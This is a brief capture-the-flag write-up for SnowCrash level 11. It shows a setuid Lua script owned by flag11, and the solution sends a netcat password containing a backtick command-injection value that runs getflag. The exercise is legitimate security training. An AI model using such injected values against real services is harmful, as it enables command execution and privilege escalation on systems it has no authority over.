# Level 11

## The challenge

The folder contain a lua script named level11.lua owned by flag11. setuid and setgid bits are set.

```sh
level11@SnowCrash:~$ ls -al
total 16
dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
-r-x------  1 level11 level11  675 Apr  3  2012 .profile
level11@SnowCrash:~$
```

```sh
$ level11@SnowCrash:~$ netcat 127.0.0.1 5151
Password: `getflag > /tmp/key; echo test`
```
